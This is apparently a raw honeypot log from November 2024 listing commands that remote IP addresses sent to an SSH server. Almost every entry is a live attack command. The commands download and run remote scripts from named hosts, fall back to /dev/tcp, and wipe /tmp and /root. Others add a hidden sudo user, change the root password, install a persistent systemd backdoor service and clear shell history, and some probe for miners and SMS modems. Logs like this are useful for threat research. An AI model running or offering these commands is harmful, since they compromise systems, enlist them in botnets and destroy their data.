start
2024-11-19 20:47:48.246951 - ('87.120.113.231', 35844) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi
2024-11-20 17:00:07.619407 - ('37.44.238.68', 55908) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-20 17:00:09.816002 - ('37.44.238.68', 55904) - whoami
2024-11-20 17:00:12.902727 - ('37.44.238.68', 55922) - whoami
2024-11-20 17:00:15.177800 - ('37.44.238.68', 55926) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-20 17:00:17.125703 - ('37.44.238.68', 39314) - whoami
2024-11-20 17:00:19.269274 - ('37.44.238.68', 39320) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-20 17:00:21.469191 - ('37.44.238.68', 39322) - whoami
2024-11-20 17:00:23.496808 - ('37.44.238.68', 39334) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-20 17:00:26.552401 - ('37.44.238.68', 58818) - whoami
2024-11-20 17:00:27.999608 - ('37.44.238.68', 58828) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-20 17:00:30.374437 - ('37.44.238.68', 58838) - whoami
2024-11-20 17:00:32.670410 - ('37.44.238.68', 41778) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-20 17:00:35.006598 - ('37.44.238.68', 41790) - whoami
2024-11-20 17:00:37.197049 - ('37.44.238.68', 41796) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-20 17:00:39.441014 - ('37.44.238.68', 41800) - whoami
2024-11-20 17:00:41.987708 - ('37.44.238.68', 41812) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-20 17:00:45.127940 - ('37.44.238.68', 34098) - whoami
2024-11-20 17:00:47.519573 - ('37.44.238.68', 34102) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-20 17:00:49.771098 - ('37.44.238.68', 34114) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-20 17:00:51.893900 - ('37.44.238.68', 54916) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-20 17:00:54.169508 - ('37.44.238.68', 54930) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-20 17:00:56.901552 - ('37.44.238.68', 54946) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-20 17:00:59.637317 - ('37.44.238.68', 38306) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-20 17:01:00.803386 - ('37.44.238.68', 38316) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-20 17:01:03.780795 - ('37.44.238.68', 43520) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-20 17:09:40.019371 - ('61.1.105.136', 36299) - wget -qO - http://61.215.136.198/x/1sh | sh > /dev/null 2>&1 &
2024-11-20 17:09:40.798385 - ('61.1.105.136', 36299) - rm -rf /var/run/1sh; wget -c http://61.215.136.198/x/1sh -P /var/run && sh /var/run/1sh &
2024-11-20 17:09:41.156049 - ('61.1.105.136', 36299) - wget -qO - http://61.215.136.198/x/2sh | sh > /dev/null 2>&1 &
2024-11-20 17:09:41.512757 - ('61.1.105.136', 36299) - rm -rf /tmp/2sh; wget -c http://61.215.136.198/x/2sh -P /tmp && sh /tmp/2sh &
2024-11-20 17:09:41.868622 - ('61.1.105.136', 36299) - curl http://61.215.136.198/x/3sh | sh
2024-11-20 17:09:42.224038 - ('61.1.105.136', 36299) - cd /var/run ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &
2024-11-20 17:09:42.580592 - ('61.1.105.136', 36299) - cd /tmp ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &
2024-11-20 17:09:42.936593 - ('61.1.105.136', 36299) - cd /dev/shm ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &
2024-11-20 17:09:43.292895 - ('61.1.105.136', 36299) - uname -a || cat /proc/version || echo -- 
2024-11-20 18:13:45.477890 - ('87.120.113.231', 34202) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-20 20:17:42.913158 - ('87.120.113.231', 50210) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-20 21:00:34.436107 - ('87.120.113.231', 40736) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-20 22:41:21.368224 - ('87.120.113.231', 56670) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-20 23:16:53.151315 - ('87.120.113.231', 58868) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-20 23:32:56.964440 - ('46.19.143.66', 45764) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 pxTARyZz) system && sudo usermod -aG sudo system
2024-11-20 23:32:57.238053 - ('46.19.143.66', 45764) - lscpu && echo -e "pxTARyZz\npxTARyZz" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-21 03:06:47.826266 - ('46.19.143.66', 52170) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 sGfvx6dm) system && sudo usermod -aG sudo system
2024-11-21 03:06:48.073599 - ('46.19.143.66', 52170) - lscpu && echo -e "sGfvx6dm\nsGfvx6dm" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-21 03:14:29.870792 - ('88.182.251.194', 27825) - scp -t /tmp/3ZUp6OVF
2024-11-21 03:14:30.104578 - ('88.182.251.194', 28430) - scp -t /tmp/3ZUp6OVF
2024-11-21 10:21:45.288410 - ('112.25.128.2', 44322) - /ip cloud print
2024-11-21 10:21:47.117618 - ('112.25.128.2', 44322) - ifconfig
2024-11-21 10:21:48.686619 - ('112.25.128.2', 44322) - uname -a
2024-11-21 10:21:50.262605 - ('112.25.128.2', 44322) - cat /proc/cpuinfo
2024-11-21 10:21:51.832597 - ('112.25.128.2', 44322) - ps | grep '[Mm]iner'
2024-11-21 10:21:53.405050 - ('112.25.128.2', 44322) - ps -ef | grep '[Mm]iner'
2024-11-21 10:21:54.976159 - ('112.25.128.2', 44322) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-11-21 10:21:56.546437 - ('112.25.128.2', 44322) - echo Hi | cat -n
2024-11-21 10:41:35.810244 - ('87.120.113.231', 49122) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-21 12:53:50.958485 - ('46.19.143.66', 49396) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 qU9ggX6Y) system && sudo usermod -aG sudo system
2024-11-21 12:53:52.758045 - ('46.19.143.66', 49396) - lscpu && echo -e "qU9ggX6Y\nqU9ggX6Y" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-21 16:33:45.695295 - ('87.120.113.231', 50130) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-21 18:21:43.190992 - ('46.19.143.66', 44706) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 PHraXZhA) system && sudo usermod -aG sudo system
2024-11-21 18:21:43.563736 - ('46.19.143.66', 44706) - lscpu && echo -e "PHraXZhA\nPHraXZhA" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-21 18:33:43.429265 - ('87.120.113.231', 39718) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-21 18:37:48.923007 - ('87.120.113.231', 41306) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-21 20:25:26.696033 - ('87.120.113.231', 48492) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-21 21:13:58.286645 - ('195.178.110.34', 33496) - apt
2024-11-21 21:13:58.475052 - ('195.178.110.34', 33496) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-21 21:13:58.912506 - ('195.178.110.34', 40162) - apt
2024-11-21 21:13:59.107804 - ('195.178.110.34', 40162) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-21 21:13:59.519736 - ('195.178.110.34', 44548) - apt
2024-11-21 21:13:59.672471 - ('195.178.110.34', 44548) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-21 21:14:00.140899 - ('195.178.110.34', 48490) - apt
2024-11-21 21:14:00.320032 - ('195.178.110.34', 48490) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-21 21:14:00.684129 - ('195.178.110.34', 52682) - apt
2024-11-21 21:14:00.809478 - ('195.178.110.34', 52682) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-21 21:14:01.187524 - ('195.178.110.34', 56040) - apt
2024-11-21 21:14:01.387047 - ('195.178.110.34', 56040) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-21 21:14:01.862428 - ('195.178.110.34', 60844) - apt
2024-11-21 21:14:02.025345 - ('195.178.110.34', 60844) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-21 21:14:02.485381 - ('195.178.110.34', 37740) - apt
2024-11-21 21:14:02.626599 - ('195.178.110.34', 37740) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-21 21:14:03.106582 - ('195.178.110.34', 42870) - apt
2024-11-21 21:14:03.292416 - ('195.178.110.34', 42870) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-21 21:14:03.727269 - ('195.178.110.34', 48722) - apt
